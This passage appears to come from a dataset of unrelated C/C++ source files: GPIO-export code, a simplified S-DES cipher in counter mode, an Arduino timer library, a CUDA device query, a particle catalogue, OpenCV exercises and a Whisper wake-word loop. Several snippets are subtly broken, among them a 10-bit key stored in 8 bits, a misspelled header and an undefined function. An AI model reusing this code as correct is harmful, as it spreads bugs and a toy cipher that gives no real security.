outfile(\\\"/sys/class/gpio/export\\\");\\n\";\r\nfileStream << \"        outfile << std::to_string(id) << \\\"\\\\n\\\"; \\n\";\r\nfileStream << \"        outfile.close();  \\n\";\r\nfileStream << \"        std::string first=\\\"/sys/class/gpio/gpio\\\";\\n\";\r\nfileStream << \"        std::string two=std::to_string(id);\\n\";\r\nfileStream << \"        std::string three=\\\"/direction\\\";\\n\";\r\nfileStream << \"        std::string result = first +two+ three;\\n\";\r\nfileStream << \"        std::ofstream outfile1(result);\\n\";\r\nfileStream << \"        outfile1 << \\\"in\\\" << \\\"\\\\n\\\"; \\n\";\r\nfileStream << \"        outfile1.close();\\n\";\r\nfileStream << \"    }\\n\";\r\nfileStream << \"    else{\\n\";\r\nfileStream << \"        std::ofstream outfile(\\\"/sys/class/gpio/export\\\");\\n\";\r\nfileStream << \"        outfile << std::to_string(id) << \\\"\\\\n\\\"; \\n\";\r\nfileStream << \"        outfile.close();  \\n\";\r\nfileStream << \"        std::string first=\\\"/sys/class/gpio/gpio\\\";\\n\";\r\nfileStream << \"        std::string two=std:",
    "#include <stdio.h>\r\n#include <stdint.h>\r\n\r\n// Function prototypes\r\nuint8_t sdes_encrypt(uint8_t plaintext, uint8_t key);\r\nuint8_t sdes_decrypt(uint8_t ciphertext, uint8_t key);\r\nuint8_t key_generation(uint16_t key10, int round);\r\nuint8_t fk(uint8_t half, uint8_t subkey);\r\nuint8_t permute(uint8_t input, int *perm, int size);\r\nuint8_t sbox(uint8_t input, int sbox[4][4]);\r\n\r\n// Define constants for S-DES key schedule and encryption\r\nint IP[] = {1, 5, 2, 0, 3, 7, 4, 6}; // Initial Permutation\r\nint IP_inv[] = {3, 0, 2, 4, 6, 1, 7, 5}; // Inverse of IP\r\nint P4[] = {1, 3, 2, 0}; // Permutation P4\r\nint EP[] = {3, 0, 1, 2, 1, 2, 3, 0}; // Expansion permutation for fK\r\n\r\nint S0[4][4] = { {1, 0, 3, 2}, {3, 2, 1, 0}, {0, 2, 1, 3}, {3, 1, 3, 2} };\r\nint S1[4][4] = { {0, 1, 2, 3}, {2, 0, 1, 3}, {3, 0, 1, 0}, {2, 1, 0, 3} };\r\n\r\n// Helper function to print 8-bit binary\r\nvoid print_binary(uint8_t num) {\r\n    for (int i = 7; i >= 0; i--) {\r\n        printf(\"%d\", (num >> i) & 1);\r\n    }\r\n}\r\n\r\n// Permutation function\r\nuint8_t permute(uint8_t input, int *perm, int size) {\r\n    uint8_t result = 0;\r\n    for (int i = 0; i < size; i++) {\r\n        result |= ((input >> (7 - perm[i])) & 1) << (size - 1 - i);\r\n    }\r\n    return result;\r\n}\r\n\r\n// S-box lookup function\r\nuint8_t sbox(uint8_t input, int sbox[4][4]) {\r\n    int row = ((input >> 3) & 0x2) | (input & 0x1);\r\n    int col = (input >> 1) & 0x3;\r\n    return sbox[row][col];\r\n}\r\n\r\n// Function fk: Applies round function using subkey\r\nuint8_t fk(uint8_t half, uint8_t subkey) {\r\n    uint8_t ep_half = permute(half, EP, 8); // Expansion permutation\r\n    ep_half ^= subkey; // XOR with subkey\r\n    \r\n    // Split to two 4-bit halves for S-boxes\r\n    uint8_t left = ep_half >> 4;\r\n    uint8_t right = ep_half & 0x0F;\r\n    \r\n    // Apply S-boxes\r\n    uint8_t sbox_output = (sbox(left, S0) << 2) | sbox(right, S1);\r\n    \r\n    // Apply P4 permutation\r\n    return permute(sbox_output, P4, 4);\r\n}\r\n\r\n// Key generation: Generate subkey for round 1 and round 2 from 10-bit key\r\nuint8_t key_generation(uint16_t key10, int round) {\r\n    // Shift the 10-bit key and return the required subkey (for simplicity)\r\n    return (round == 1) ? (key10 >> 2) & 0xFF : (key10 >> 4) & 0xFF;\r\n}\r\n\r\n// S-DES encryption function\r\nuint8_t sdes_encrypt(uint8_t plaintext, uint8_t key) {\r\n    uint8_t k1 = key_generation(key, 1);\r\n    uint8_t k2 = key_generation(key, 2);\r\n    \r\n    // Initial Permutation\r\n    uint8_t ip = permute(plaintext, IP, 8);\r\n    \r\n    // Split to left and right halves\r\n    uint8_t left = ip >> 4;\r\n    uint8_t right = ip & 0x0F;\r\n    \r\n    // Round 1\r\n    uint8_t round1_output = left ^ fk(right, k1);\r\n    \r\n    // Round 2 (Swap and apply fk again)\r\n    uint8_t round2_output = round1_output ^ fk(left, k2);\r\n    \r\n    // Concatenate and apply inverse IP\r\n    uint8_t ciphertext = permute((right << 4) | round2_output, IP_inv, 8);\r\n    \r\n    return ciphertext;\r\n}\r\n\r\n// S-DES decryption function (similar to encryption but with reverse subkeys)\r\nuint8_t sdes_decrypt(uint8_t ciphertext, uint8_t key) {\r\n    uint8_t k1 = key_generation(key, 1);\r\n    uint8_t k2 = key_generation(key, 2);\r\n    \r\n    // Initial Permutation\r\n    uint8_t ip = permute(ciphertext, IP, 8);\r\n    \r\n    // Split to left and right halves\r\n    uint8_t left = ip >> 4;\r\n    uint8_t right = ip & 0x0F;\r\n    \r\n    // Round 1 (reverse round 2 of encryption)\r\n    uint8_t round1_output = left ^ fk(right, k2);\r\n    \r\n    // Round 2 (Swap and apply fk with k1)\r\n    uint8_t round2_output = round1_output ^ fk(left, k1);\r\n    \r\n    // Concatenate and apply inverse IP\r\n    uint8_t plaintext = permute((right << 4) | round2_output, IP_inv, 8);\r\n    \r\n    return plaintext;\r\n}\r\n\r\n// Main function: Encrypt/Decrypt in Counter Mode\r\nint main() {\r\n    // Test data (S-DES with counter starting at 0000 0000)\r\n    uint8_t key = 0b0111111101; // 10-bit binary key\r\n    uint8_t counter = 0b00000000; // Start counter at 0000 0000\r\n    uint8_t plaintext[] = {0b00000001, 0b00000010, 0b00000100}; // Binary plaintext blocks\r\n    uint8_t expected_ciphertext[] = {0b00111000, 0b01001111, 0b00110010}; // Expected ciphertext\r\n    \r\n    // Encrypt plaintext using S-DES in Counter Mode\r\n    printf(\"Encrypting in Counter Mode:\\n\");\r\n    for (int i = 0; i < 3; i++) {\r\n        uint8_t encrypted_counter = sdes_encrypt(counter, key); // Encrypt the counter\r\n        uint8_t ciphertext = plaintext[i] ^ encrypted_counter; // XOR with plaintext\r\n        \r\n        printf(\"Plaintext block %d: \", i + 1);\r\n        print_binary(plaintext[i]);\r\n        printf(\" -> Ciphertext: \");\r\n        print_binary(ciphertext);\r\n        printf(\"\\n\");\r\n        \r\n        counter++; // Increment counter for next block\r\n    }\r\n    \r\n    return 0;\r\n}\r\n",
    "/*\n * SimpleTimer.cpp\n *\n * SimpleTimer - A timer library for Arduino.\n * Author: mromani@ottotecnica.com\n * Copyright (c) 2010 OTTOTECNICA Italy\n *\n * Callback function parameters added & compiler warnings\n * removed by Bill Knight <billk@rosw.com> 20March2017\n *\n * This library is free software; you can redistribute it\n * and/or modify it under the terms of the GNU Lesser\n * General Public License as published by the Free Software\n * Foundation; either version 2.1 of the License, or (at\n * your option) any later version.\n *\n * This library is distributed in the hope that it will\n * be useful, but WITHOUT ANY WARRANTY; without even the\n * implied warranty of MERCHANTABILITY or FITNESS FOR A\n * PARTICULAR PURPOSE.  See the GNU Lesser General Public\n * License for more details.\n *\n * You should have received a copy of the GNU Lesser\n * General Public License along with this library; if not,\n * write to the Free Software Foundation, Inc.,\n * 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA\n */\n\n\n#include \"Blynk/BlynkTimer.h\"\n#include <string.h>\n\n// Select time function:\n//static inline unsigned long elapsed() { return micros(); }\nstatic inline unsigned long elapsed() { return BlynkMillis(); }\n\n\nSimpleTimer::SimpleTimer()\n    : numTimers (-1)\n{\n}\n\nvoid SimpleTimer::init() {\n    unsigned long current_millis = elapsed();\n\n    for (int i = 0; i < MAX_TIMERS; i++) {\n        timer[i] = timer_t();\n        timer[i].prev_millis = current_millis;\n    }\n\n    numTimers = 0;\n}\n\n\nvoid SimpleTimer::run() {\n    int i;\n    unsigned long current_millis;\n\n    // get current time\n    current_millis = elapsed();\n\n    for (i = 0; i < MAX_TIMERS; i++) {\n\n        timer[i].toBeCalled = DEFCALL_DONTRUN;\n\n        // jump over empty slots\n        if (isValidTimer(i)) {\n\n            // is it time to process this timer ?\n            // see http://arduino.cc/forum/index.php/topic,124048.msg932592.html#msg932592\n\n            if ((current_millis - timer[i].prev_millis) >= timer[i].delay) {\n\n                if (timer[i].delay) {\n                    unsigned long skipTimes = (current_millis - timer[i].prev_millis) / timer[i].delay;\n                    // update time\n                    timer[i].prev_millis += timer[i].delay * skipTimes;\n                } else {\n                    timer[i].prev_millis = current_millis;\n                }\n\n                // check if the timer callback has to be executed\n                if (timer[i].enabled) {\n\n                    // \"run forever\" timers must always be executed\n                    if (timer[i].maxNumRuns == RUN_FOREVER) {\n                        timer[i].toBeCalled = DEFCALL_RUNONLY;\n                    }\n                    // other timers get executed the specified number of times\n                    else if (timer[i].numRuns < timer[i].maxNumRuns) {\n                        timer[i].toBeCalled = DEFCALL_RUNONLY;\n                        timer[i].numRuns++;\n\n                        // after the last run, delete the timer\n                        if (timer[i].numRuns >= timer[i].maxNumRuns) {\n                            timer[i].toBeCalled = DEFCALL_RUNANDDEL;\n                        }\n                    }\n                }\n            }\n        }\n    }\n\n    for (i = 0; i < MAX_TIMERS; i++) {\n        if (timer[i].toBeCalled == DEFCALL_DONTRUN)\n            continue;\n\n        if (timer[i].hasParam)\n            timer[i].callback_p(timer[i].param);\n        else\n            timer[i].callback();\n\n        if (timer[i].toBeCalled == DEFCALL_RUNANDDEL)\n            deleteTimer(i);\n    }\n}\n\n\n// find the first available slot\n// return -1 if none found\nint SimpleTimer::findFirstFreeSlot() {\n    // all slots are used\n    if (numTimers >= MAX_TIMERS) {\n        return -1;\n    }\n\n    // return the first slot with no callback (i.e. free)\n    for (int i = 0; i < MAX_TIMERS; i++) {\n        if (!isValidTimer(i)) {\n            return i;\n        }\n    }\n\n    // no free slots found\n    return -1;\n}\n\n\nint SimpleTimer::setupTimer(unsigned long d, const timer_callback& f, unsigned n) {\n    int freeTimer;\n\n    if (numTimers < 0) {\n        init();\n    }\n\n    freeTimer = findFirstFreeSlot();\n    if (freeTimer < 0) {\n        return -1;\n    }\n\n    if (f == NULL) {\n        return -1;\n    }\n\n    timer[freeTimer].delay = d;\n    timer[freeTimer].callback = f;\n    timer[freeTimer].hasParam = false;\n    timer[freeTimer].maxNumRuns = n;\n    timer[freeTimer].enabled = true;\n    timer[freeTimer].prev_millis = elapsed();\n\n    numTimers++;\n\n    return freeTimer;\n}\n\nint SimpleTimer::setupTimer(unsigned long d, timer_callback_p f, void* p, unsigned n) {\n    int freeTimer;\n\n    if (numTimers < 0) {\n        init();\n    }\n\n    freeTimer = findFirstFreeSlot();\n    if (freeTimer < 0) {\n        return -1;\n    }\n\n    if (f == NULL) {\n        return -1;\n    }\n\n    timer[freeTimer].delay = d;\n    timer[freeTimer].callback_p = f;\n    timer[freeTimer].param = p;\n    timer[freeTimer].hasParam = true;\n    timer[freeTimer].maxNumRuns = n;\n    timer",
    "#include <stdio.h>\n#include <cuda_runtime.h>\n#include <string>\n\n#include \"utils.hpp\"\n\nint main(){\n    int count;\n    int index = 0;\n    cudaGetDeviceCount(&count);\n    while (index < count) {\n        cudaSetDevice(index);\n        cudaDeviceProp prop;\n        cudaGetDeviceProperties(&prop, index);\n        LOG(\"%-40s\",             \"*********************Architecture related**********************\");\n        LOG(\"%-40s%d%s\",         \"Device id: \",                   index, \"\");\n        LOG(\"%-40s%s%s\",         \"Device name: \",                 prop.name, \"\");\n        LOG(\"%-40s%.1f%s\",       \"Device compute capability: \",   prop.major + (float)prop.minor / 10, \"\");\n        LOG(\"%-40s%.2f%s\",       \"GPU global meory size: \",       (float)prop.totalGlobalMem / (1<<30), \"GB\");\n        LOG(\"%-40s%.2f%s\",       \"L2 cache size: \",               (float)prop.l2CacheSize / (1<<20), \"MB\");\n        LOG(\"%-40s%.2f%s\",       \"Shared memory per block: \",     (float)prop.sharedMemPerBlock / (1<<10), \"KB\");\n        LOG(\"%-40s%.2f%s\",       \"Shared memory per SM: \",        (float)prop.sharedMemPerMultiprocessor / (1<<10), \"KB\");\n        LOG(\"%-40s%.2f%s\",       \"Device clock rate: \",           prop.clockRate*1E-6, \"GHz\");\n        LOG(\"%-40s%.2f%s\",       \"Device memory clock rate: \",    prop.memoryClockRate*1E-6, \"Ghz\");\n        LOG(\"%-40s%d%s\",         \"Number of SM: \",                prop.multiProcessorCount, \"\");\n        LOG(\"%-40s%d%s\",         \"Warp size: \",                   prop.warpSize, \"\");\n\n        LOG(\"%-40s\",             \"*********************Parameter related************************\");\n        LOG(\"%-40s%d%s\",         \"Max block numbers: \",           prop.maxBlocksPerMultiProcessor, \"\");\n        LOG(\"%-40s%d%s\",         \"Max threads per block: \",       prop.maxThreadsPerBlock, \"\");\n        LOG(\"%-40s%d:%d:%d%s\",   \"Max block dimension size:\",     prop.maxThreadsDim[0], prop.maxThreadsDim[1], prop.maxThreadsDim[2], \"\");\n        LOG(\"%-40s%d:%d:%d%s\",   \"Max grid dimension size: \",     prop.maxGridSize[0], prop.maxGridSize[1], prop.maxGridSize[2], \"\");\n        index ++;\n        printf(\"\\n\");\n    }\n    return 0;\n}\n",
    "// main.cpp - Main function to demonstrate the functionalities of the Particle Catalogue.\n// Author: Raul Scanlon, Date: 27/05/2024\n#include <iostream>\n#include <memory>\n#include \"ParticleCatalogue.h\"\n#include \"lepton.h\"\n#include \"quark.h\"\n#include \"boson.h\"\n#include \"FourMomentum.h\"\n#include \"muon.h\"\n#include \"tau.h\"\n#include \"WBoson.h\"\n#include \"ZBoson.h\"\n#include \"photon.h\"\n#include \"neutrino.h\"\n#include \"HiggsBoson.h\"\n#include \"gluon.h\"\n#include \"electron.h\"\n\nvoid handleDecay(const std::shared_ptr<Particle>& particle, ParticleCatalogue& catalogue);\n\nint main() {\n  ParticleCatalogue catalogue;\n\n  // FourMomentum instances\n  FourMomentum electronMomentum(0.511, 0.0, 0.0, 0.0);\n  FourMomentum muonMomentum(105.7, 0.0, 0.0, 0.0);\n  FourMomentum tauMomentum(1777.0, 0.0, 0.0, 0.0);\n  FourMomentum upQuarkMomentum(2.3, 0.0, 0.0, 0.0);\n  FourMomentum downQuarkMomentum(4.8, 0.0, 0.0, 0.0);\n  FourMomentum strangeQuarkMomentum(95.0, 0.0, 0.0, 0.0);\n  FourMomentum charmQuarkMomentum(1275.0, 0.0, 0.0, 0.0);\n  FourMomentum bottomQuarkMomentum(4180.0, 0.0, 0.0, 0.0);\n  FourMomentum topQuarkMomentum(173070.0, 0.0, 0.0, 0.0);\n  FourMomentum zBosonMomentum(91200.0, 0.0, 0.0, 0.0);\n  FourMomentum wBosonMomentum(80400.0, 0.0, 0.0, 0.0);\n  FourMomentum higgsMomentum(126000.0, 0.0, 0.0, 0.0);\n  FourMomentum photonMomentum(62.55, 0.0, 0.0, 0.0);\n  FourMomentum gluonMomentum(0.0, 0.0, 0.0, 0.0);\n  FourMomentum neutrinoMomentum(0.0, 0.0, 0.0, 0.0);\n\n  // Add particles to the catalogue\n  auto electron = std::make_shared<Electron>(-1.0, 0.5, 1, electronMomentum, 0.511);\n  auto positron = std::make_shared<Electron>(-1.0, 0.5, -1, electronMomentum, 0.511, true);\n  auto muon = std::make_shared<Muon>(-1.0, 0.5, 1, muonMomentum, 105.7, true);\n  auto antiMuon = std::make_shared<Muon>(-1.0, 0.5, -1, muonMomentum, 105.7, true, true);\n  auto tau = std::make_shared<Tau>(-1.0, 0.5, 1, tauMomentum, 1777.0);\n  auto antiTau = std::make_shared<Tau>(-1.0, 0.5, -1, tauMomentum, 1777.0, true);\n  auto higgs = std::make_shared<HiggsBoson>(0.0, 0.0, higgsMomentum, 126000.0);\n  auto wboson = std::make_shared<WBoson>(1.0, 1.0, wBosonMomentum, 80400.0);\n  auto antiwboson = std::make_shared<WBoson>(1.0, 1.0, wBosonMomentum, 80400.0, true);\n  auto zboson = std::make_shared<ZBoson>(0.0, 1.0, zBosonMomentum, 91200.0);\n  auto photon = std::make_shared<Photon>(photonMomentum);\n  auto gluon = std::make_shared<Gluon>(1, gluonMomentum, \"red\", \"blue\");\n\n  auto neutrinoE = std::make_shared<Neutrino>(0.0, 0.5, 1, neutrinoMomentum, 0.0, \"Electron Neutrino\", false, false);\n  auto antineutrinoE = std::make_shared<Neutrino>(0.0, 0.5, -1, neutrinoMomentum, 0.0, \"Electron Anti-Neutrino\", false, true);\n  auto neutrinoMu = std::make_shared<Neutrino>(0.0, 0.5, 1, neutrinoMomentum, 0.0, \"Muon Neutrino\", false, false);\n  auto antineutrinoMu = std::make_shared<Neutrino>(0.0, 0.5, -1, neutrinoMomentum, 0.0, \"Muon Anti-Neutrino\", true, true);\n  auto neutrinoTau = std::make_shared<Neutrino>(0.0, 0.5, 1, neutrinoMomentum, 0.0, \"Tau Neutrino\", false, false);\n  auto antineutrinoTau = std::make_shared<Neutrino>(0.0, 0.5, -1, neutrinoMomentum, 0.0, \"Tau Anti-Neutrino\", false, true);\n\n  auto quarkUp = std::make_shared<Quark>(2.0 / 3.0, 0.5, 1.0 / 3.0, \"red\", upQuarkMomentum, 2.3, \"Up Quark\", false);\n  auto antiquarkUp = std::make_shared<Quark>(2.0 / 3.0, 0.5, -1.0 / 3.0, \"anti-red\", upQuarkMomentum, 2.3, \"Anti-Up Quark\", true);\n  auto quarkDown = std::make_shared<Quark>(-1.0 / 3.0, 0.5, 1.0 / 3.0, \"blue\", downQuarkMomentum, 4.8, \"Down Quark\", false);\n  auto antiquarkDown = std::make_shared<Quark>(-1.0 / 3.0, 0.5, -1.0 / 3.0,  \"anti-blue\", downQuarkMomentum, 4.8, \"Anti-Down Quark\", true);\n  auto quarkCharm = std::make_shared<Quark>(2.0 / 3.0, 0.5, 1.0 / 3.0, \"green\", charmQuarkMomentum, 1275.0, \"Charm Quark\", false);\n  auto antiquarkCharm = std::make_shared<Quark>(2.0 / 3.0, 0.5, -1.0 / 3.0, \"anti-green\", charmQuarkMomentum, 1275.0, \"Anti-Charm Quark\", true);\n  auto quarkStrange = std::make_shared<Quark>(-1.0 / 3.0, 0.5, 1.0 / 3.0, \"red\", strangeQuarkMomentum, 95.0, \"Strange Quark\", false);\n  auto antiquarkStrange = std::make_shared<Quark>(-1.0 / 3.0, 0.5, -1.0 / 3.0,  (\"anti-red\"), strangeQuarkMomentum, 95.0, \"Anti-Strange Quark\", true);\n  auto quarkTop = std::make_shared<Quark>(2.0 / 3.0, 0.5, 1.0 / 3.0, \"blue\", topQuarkMomentum, 173070.0, \"Top Quark\", false);\n  auto antiquarkTop = std::make_shared<Quark>(2.0 / 3.0, 0.5, -1.0 / 3.0, \"anti-blue\", topQuarkMomentum, 173070.0, \"Anti-Top Quark\", true);\n  auto quarkBottom = std::make_shared<Quark>(-1.0 / 3.0, 0.5, 1.0 / 3.0, \"green\", bottomQuarkMomentum, 4180.0, \"Bottom Quark\", false);\n  auto antiquarkBottom = std::make_shared<Quark>(-1.0 / 3.0, 0.5, -1.0 / 3.0, \"anti-green\", bottomQuarkMomentum, 4180.0, \"Anti-Bottom Quark\", true);\n\n  // Handle decays\n  handleDecay(tau, catalogue);\n  handleDecay(higgs, catalogue);\n  handleDecay(wboson, catalogue);\n  handleDecay(antiwboson, catalogue);\n  handleDecay(zboson, catalogue);\n\n  // Add particles to c",
    "#include \"opencv2/opencv.hpp\"\n#include <iostream>\nusing namespace std;\n\n// \u8f93\u51fa\u51fd\u6570\nint output(cv::Mat image, string outputPath);\n\nint main(){\n    // \u8bfb\u53d6\u56fe\u50cf\n    cv::Mat image = cv::imread(\"..//resources//test_image.png\", cv::IMREAD_COLOR);\n    output(image, \"..//output//origin.png\");\n    cv::Mat grayImage;\n    cv::cvtColor(image, grayImage, cv::COLOR_BGR2GRAY); // \u8f6c\u6362\u4e3a\u7070\u5ea6\u56fe\u50cf\n    output(grayImage, \"..//output//grey.png\");\n    cv::Mat hsvImage;\n    cv::cvtColor(image, hsvImage, cv::COLOR_BGR2HSV); // \u8f6c\u6362\u4e3ahsv\n    output(hsvImage, \"..//output//hsv.png\");\n    cv::Mat blurImage;\n    cv::blur(image, blurImage, cv::Size(10, 10)); // \u5747\u503c\u6ee4\u6ce2 \u5185\u683810X10\n    output(blurImage, \"..//output//blur.png\");\n    cv::Mat gaussianBlurredImage;\n    cv::GaussianBlur(image, gaussianBlurredImage, cv::Size(9, 9), 1.5); // \u9ad8\u65af\u6ee4\u6ce2\n    output(gaussianBlurredImage, \"..//output//Gaussianblur.png\");\n    cv::Mat redBGRImage;\n    cv::Mat mask; // \u63a9\u7801\uff0c\u5c31\u662f\u4e00\u5f20\u9ed1\u767d\u56fe\u50cf\n    cv::Scalar lowerRed(0, 0, 100); // \u7ea2\u8272\u7684\u4e0b\u9650\n    cv::Scalar upperRed(120, 120, 255); // \u7ea2\u8272\u7684\u4e0a\u9650\n    // \u521b\u5efa\u63a9\u7801\n    cv::inRange(image, lowerRed, upperRed, mask);\n    // \u63d0\u53d6\u7ea2\u8272\u533a\u57df\n    cv::bitwise_and(image, image, redBGRImage, mask);\n    output(redBGRImage, \"..//output//red BGR.png\");\n    // \u5b9a\u4e49\u7ea2\u8272\u7684HSV\u8303\u56f4\n    cv::Scalar lowerRed1(0, 100, 100);\n    cv::Scalar upperRed1(10, 255, 255);\n    cv::Scalar lowerRed2(160, 100, 100);\n    cv::Scalar upperRed2(179, 255, 255);\n    // \u521b\u5efa\u63a9\u7801\n    cv::Mat mask1, mask2;\n    cv::inRange(hsvImage, lowerRed1, upperRed1, mask1);\n    cv::inRange(hsvImage, lowerRed2, upperRed2, mask2);\n    cv::bitwise_or(mask1, mask2, mask);\n    // \u63d0\u53d6\u7ea2\u8272\u533a\u57df\n    cv::Mat redHSVImage;\n    cv::bitwise_and(image, image, redHSVImage, mask);\n    output(redHSVImage, \"..//output//red HSV.png\");\n    cv::Mat maskToContours = mask.clone();\n    std::vector<std::vector<cv::Point>> contours;\n    std::vector<cv::Vec4i> hierarchy;\n    // \u627e\u5230\u5916\u8f6e\u5ed3\n    cv::findContours(maskToContours, contours, hierarchy, cv::RETR_EXTERNAL, cv::CHAIN_APPROX_SIMPLE);\n    // RETR_EXTERNAL \u53ea\u627e\u5916\u8f6e\u5ed3\n    // CHAIN_APPROX_SIMPLE \u538b\u7f29\u627e\u7684contours\u7684\u70b9\u7684\u6570\u91cf\n    // \u539f\u59cb\u56fe\u50cf\u4f1a\u88ab\u4fee\u6539\uff0c\u6240\u4ee5\u8981\u590d\u5236\u4e00\u4efd\n    // \u7ed8\u5236\u5916\u8f6e\u5ed3\u5230\u4e00\u4e2a\u65b0\u7684\u56fe\u50cf\u4e0a\n    //cv::Mat contourImage = image.clone();\n    cv::Mat contourImage = cv::Mat::zeros(mask.size(), CV_8UC3);\n    cv::Mat imageWithBoundingBox = image.clone();\n    int contourIdx = 0;\n        for (size_t i = 0; i < contours.size(); i++)\n    {\n        double area = cv::contourArea(contours[i]);\n        // \u8fc7\u6ee4\u6389\u9762\u79ef\u8fc7\u5c0f\u7684\u8f6e\u5ed3\n        if (area > 10)\n        {\n            // \u753b\u5916\u63a5\u77e9\u5f62\n            cv::Rect boundingBox = cv::boundingRect(contours[i]);\n            cv::rectangle(imageWithBoundingBox, boundingBox, cv::Scalar(0, 0, 255), 1); // \u7ea2\u8272\u8fb9\u754c\u6846\uff0c\u7ebf\u5bbd1\n            // \u753b\u8f6e\u5ed3\n            cv::drawContours(contourImage, contours, (int)i, cv::Scalar(0, 0, 255), 1.2);\n\n            // \u521b\u5efa\u4e00\u4e2a\u63a9\u7801\u56fe\u50cf\u7528\u4e8e\u8ddd\u79bb\u53d8\u6362\n            cv::Mat contourMask = cv::Mat::zeros(mask.size(), CV_8UC1);\n            cv::drawContours(contourMask, contours, (int)i, cv::Scalar(255), cv::FILLED); // \u586b\u5145\n\n            // \u8ddd\u79bb\u53d8\u6362\n            cv::Mat distTransform;\n            cv::distanceTransform(contourMask, distTransform, cv::DIST_L2, 5);\n\n            // \u627e\u5230\u8ddd\u79bb\u53d8\u6362\u56fe\u50cf\u4e2d\u7684\u6700\u5927\u503c\u53ca\u5176\u4f4d\u7f6e\n            double maxVal;\n            cv::Point maxLoc;\n            cv::minMaxLoc(distTransform, nullptr, &maxVal, nullptr, &maxLoc);\n\n            // \u5728\u8f6e\u5ed3\u4e0a\u7f16\u53f7\n            cv::putText(contourImage, std::to_string(contourIdx), maxLoc, cv::FONT_HERSHEY_SIMPLEX, 0.5, cv::Scalar(255, 255, 255), 0.5);\n\n            // \u8f93\u51fa\u7f16\u53f7\u548c\u5bf9\u5e94\u7684\u8f6e\u5ed3\u9762\u79ef\n            cout << \"Contour #\" << contourIdx << \" area: \" << area << endl;\n\n            contourIdx++;\n        }\n\n    }\n    output(contourImage, \"..//output//contour.png\");\n    output(imageWithBoundingBox, \"..//output//bounding box.png\");\n    //\u7070\u5ea6\u56fe\u4f7f\u7528\u6700\u5f00\u59cb\u521b\u5efa\u7684\u90a3\u4e2a\n    cv::Mat binaryImage;\n    double thresh = 200; // \u9608\u503c\uff0c\u53ef\u8c03\n    double maxValue = 255; // \u4e8c\u503c\u5316\u540e\u6700\u5927\u503c\n    cv::threshold(grayImage, binaryImage, thresh, maxValue, cv::THRESH_BINARY);\n    output(binaryImage, \"..//output//binary.png\");\n    // \u521b\u5efa\u5377\u79ef\u6838\n    int morph_size = 2; // \u6838\u5927\u5c0f\n    cv::Mat element = cv::getStructuringElement(cv::MORPH_RECT, // \u6838\u7684\u5f62\u72b6\uff0c\u8fd9\u91cc\u91c7\u7528\u77e9\u5f62\n                                                cv::Size(2 * morph_size + 1, 2 * morph_size + 1) // \u5927\u5c0f\n                                                );\n\n    // \u7b2c\u4e00\u6b21\u8150\u8680\uff0c\u6d88\u9664\u5c0f\u767d\u70b9\u566a\u58f0\n    cv::Mat firstEroded;\n    cv::erode(binaryImage, firstEroded, element);\n\n    // \u7b2c\u4e00\u6b21\u81a8\u80c0\uff0c\u5c06\u56fe\u50cf\u81a8\u80c0\u5230\u539f\u6765\u5927\u5c0f\n    cv::Mat firstDilated;\n    cv::dilate(firstEroded, firstDilated, element);\n\n    // \u7b2c\u4e8c\u6b21\u81a8\u80c0\uff0c\u53bb\u9664\u9ed1\u8272\u566a\u70b9\n    cv::Mat secondDilated;\n    cv::dilate(firstDilated, secondDilated, element);\n\n    // \u7b2c\u4e8c\u6b21\u8150\u8680\uff0c\u8150\u8680\u5230\u539f\u6765\u5927\u5c0f\n    cv::Mat secondEroded;\n    cv::erode(secondDilated, secondEroded, element);\n\n    output(firstDilated, \"..//output//dilated.png\");\n    output(secondEroded, \"..//output//eroded.png\");\n\n    // \u8bbe\u7f6e\u79cd\u5b50\u70b9\n    cv::Point seedPoint(0, 0); // \u6839\u636e\u9700\u8981\u8c03\u6574\u79cd\u5b50\u70b9\u7684\u4f4d\u7f6e\n\n    // \u8bbe\u7f6e\u586b\u5145\u989c\u8272\n    int newColor = 128; // \u7070\u8272\n\n    // \u5b9a\u4e49\u586b\u5145\u7684\u9608\u503c\u8303\u56f4\n    int loDiff = 0;\n    int upDiff = 0;\n\n    // \u6f2b\u6c34\n    cv::Mat dst = secondEroded.clone();\n    cv::floodFill(  \n                    dst, \n                    seedPoint, //\u8d77\u59cb\u70b9\n              ",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <curl/curl.h>\n#include <nlohmann/json.hpp>\n#include <csstudio> // for remove\n#include <thread>\n#include <chrono>\n\nusing namespace std;\n\n// Function to perform HTTP Post requests using libcurl\nsize_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {\n    ((string*)userp)->append((char*)contents, size * nmemb);\n    return size * nmemb;\n}\n\n// send audio file for STT (whisper)\nstring sendAudioToWhisper(const string& apiKey, const string& audioFilePath) {\n    CURL* curl;\n    CURLcode res;\n    string readBuffer;\n\n    curl = curl_easy_init();\n    if (curl) {\n        struct curl_slist* headers = NULL;\n        headers = curl_slist_append(headers, (\"Authorization: Bearer \" + apiKey).c_str());\n        headers = curl_slist_append(headers, \"Content-Type: multipart/form-data\");\n\n        curl_mime* form = curl_mime_init(curl);\n        curl_mimepart* field = curl_mime_addpart(form);\n        curl_mime_name(field, \"file\");\n        curl_mime_filedata(field, audioFilePath.c_str());\n\n        string url = \"https://api.openai.com/v1/audio/transcriptions\";\n\n        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());\n        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);\n        curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);\n        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);\n        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);\n\n        res = curl_easy_perform(curl);\n        curl_easy_cleanup(curl);\n        curl_mime_free(form);\n        curl_slist_free_all(headers);\n    }\n    return readBuffer;\n}\n\nint main() {\n    string apiKey = \"YOUR_OPENAI_API_KEY\"; // Replace with your API key\n    string audioFilePath = \"path_to_your_audio_file.wav\"; // Replace with your path to the audio file\n\n    string wakeWord = \"Hey AI\";  // Example wake word\n\n    // Simulate continuous listening loop\n    bool wakeWordDetected = false;\n\n    while (!wakeWordDetected) {\n        // Step 1: Send a short segment of audio to Whisper to check for the wake word\n        string response = sendAudioToWhisper(apiKey, audioFilePath);\n        auto jsonResponse = nlohmann::json::parse(response);\n        string transcript = jsonResponse[\"text\"];\n\n        cout << \"Transcribed Text: \" << transcript << endl;\n\n        // Step 2: Detect wake word in the transcribed text\n        if (detectWakeWord(transcript, wakeWord)) {\n            cout << \"Wake word detected! Ready to listen!\" << endl;\n            wakeWordDetected = true;\n        }\n        else {\n            cout << \"Wake word not detected, listening again...very subtly...\" << endl;\n        }\n\n        // Sleep to simulate continuous audio capture\n        